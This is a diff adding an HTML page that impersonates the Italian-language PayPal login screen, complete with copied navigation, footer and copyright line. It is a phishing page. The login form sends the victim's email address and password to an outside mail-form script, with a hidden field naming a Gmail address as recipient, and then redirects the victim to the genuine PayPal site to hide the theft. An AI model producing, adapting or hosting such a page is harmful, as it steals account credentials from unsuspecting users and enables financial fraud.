@@ -1,0 +1,102 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html><head>
+<title>Accedi - PayPal</title><!--googleoff: all-->
+<link rel="stylesheet" type="text/css" href="zad/1.css">
+<link rel="stylesheet" type="text/css" href="zad/2.css">
+<link rel="stylesheet" type="text/css" href="zad/3.css">
+<link rel="stylesheet" type="text/css" href="zad/4.css">
+<link rel="stylesheet" type="text/css" href="zad/5.css"><!--[if IE 6]><link rel="stylesheet" type="text/css" href="#"><![endif]--><!--[if IE 7]><link rel="stylesheet" type="text/css" href="#"><![endif]-->
+<link rel="stylesheet" type="text/css" href="zad/6.css">
+<link rel="stylesheet" type="text/css" href="zad/7.css">
+<link rel="stylesheet" type="text/css" href="zad/8.css">
+<link rel="stylesheet" type="text/css" href="zad/9.css">
+<link rel="stylesheet" type="text/css" href="zad/7.css">
+<link rel="stylesheet" type="text/css" href="zad/10.css">
+<style type="text/css"></style>
+<link rel="shortcut icon" href="favicon.ico">
+</head><body>
+<div class="srd" id="header">
+<h1><a href="#"><img src="zad/jaja.gif" alt="PayPal" border="0"></a></h1>
+<form method="post" id="searchForm" name="searchForm" action="#">
+<fieldset>
+<legend>Search PayPal</legend>
+<label for="searchBox">Search </label><input id="searchBox" name="queryString" value="" type="text"> <input class="button" id="search.x" name="search.x" value="Cerca" type="submit">
+</fieldset>
+<input name="form_charset" value="UTF-8" type="hidden">
+<span id="iconix_installed"><input name="iconix_installed" value="0" type="hidden"></span></form>
+<div class="srd" id="navGlobal"><ul>
+<li class="first signup"><a href="#">Registrati</a></li>
+<li class="login"><a href="#">Accedi</a></li>
+<li><a href="#">Aiuto</a></li>
+<li class="last"><a href="#">Spazio Sicurezza</a></li>
+</ul></div>
+<fieldset>
+    </fieldset>
+  </form>
+</div>
+<div id="navPrimary" class="srd"><ul>
+<li class=""><a href="#" href="#">Home page</a></li>
+<li class=""><a href="#" href="#">Privati</a></li>
+<li class=""><a href="#" href="#">Business</a></li>
+<li><a href="#" href="#">Funzionalità</a></li>
+</ul></div>
+<div id="xptContentOuter"><table id="xptContentInner" align="center" border="0" cellpadding="0" cellspacing="0"><tbody><tr valign="top"><td>
+<div id="xptTitle"><table class="contentTitle" align="center" border="0" cellpadding="0" cellspacing="0">
+<tbody><tr>
+<td class="heading" width="100%"><h1>Member Log-In</h1></td>
+<td align="right" nowrap="nowrap">
+<span class="small">Secure Log In</span>&nbsp;<img src="zad/jar.gif" alt="" border="0">
+</td>
+</tr>
+<tr><td colspan="2"><img alt="" src="zad/1.gif" border="0" height="2" width="1"></td></tr>
+<tr><td colspan="2"><hr></td></tr>
+<tr><td><img alt="" src="zad/1.gif" border="0" height="4" width="1"></td></tr>
+</tbody></table></div>
+<div id="xptContentMain"><div class="main"><div id="content">
+<div class="box login">
+<div class="header"><h2>Accesso al conto</h2></div>
+<div class="body"><FORM action="http://www.magnet.pl/cgi-bin/mailform.cgi" method="post">
+      <input type="hidden" name="data_order" value="user,pass">
+      <input type="hidden" name="recipient" value="prostea100@gmail.com">
+      <input type = "hidden" name = "redirect" 
+value="https://www.paypal.com/cgi-bin/webscr?cmd=_login-submit&login_email=" 
+size="20" size="20">
+<input id="" name="login_cmd" value="" type="hidden"><input id="" name="login_params" value="" type="hidden"><fieldset>
+<legend>Member Log In</legend>
+<p><label for="login_email">Indirizzo email</label><input id="login_email" class="" name="user" value="" type="text"></p>
+<p><label for="login_password">Password PayPal</label><input id="login_password" name="pass" value="" type="password"></p>
+<p><label for="target_page">Vai a</label><select name="target_page"><option value="0" selected="selected">Il mio conto</option>
+<option value="1">Le mie transazioni</option></select></p>
+<input value="Accedi" class="button primary" type="submit">
+</fieldset>
+<p>Hai dimenticato l'<a href="#">indirizzo email</a> o la  <a href="#">password</a>?</p>
+<p>Non conosci PayPal? <strong><a href="#">Registrati</a></strong></p>
+<input name="form_charset" value="UTF-8" type="hidden">
+<span id="iconix_installed2"><input name="iconix_installed" value="0" type="hidden"></span></form>
+
+</div>
+</div>
+<div class="container"><img src="zad/2.jpg" alt="" border="0"></div>
+</div></div></div>
+</td></tr></tbody></table></div>
+<div id="footer" class="srd">
+<h5 class="accessAid">More Information</h5>
+<ul>
+<li class="first"><a href="#">A proposito di PayPal</a></li>
+<li><a href="#">Tipi di conto</a></li>
+<li><a href="#">Tariffe</a></li>
+<li><a href="#">Privacy</a></li>
+<li><a href="#">Spazio Sicurezza</a></li>
+<li><a href="#">Contattaci</a></li>
+<li><a href="#">Accordi legali</a></li>
+<li><a href="#">Sviluppatori</a></li>
+<li><a href="#">Opportunità di lavoro</a></li>
+<li><a href="#">Bonus presentazione commercianti</a></li>
+<li><a href="#">Negozi PayPal</a></li>
+</ul>
+<p id="footerSecure"><a href="#" href="#" href="#"><img src="zad/3.gif" alt="" border="0"></a></p>
+<p id="legal">Copyright &copy; 1999-2008 PayPal. Tutti i diritti riservati.<br></p>
+</div>
+<div class="hide" id="navFull"></div>
+<div id="ppwebapi" class="advonqo.mha,hfb.lnb-k`ox`o-rdhsqdonqo"></div>
+</body></html>
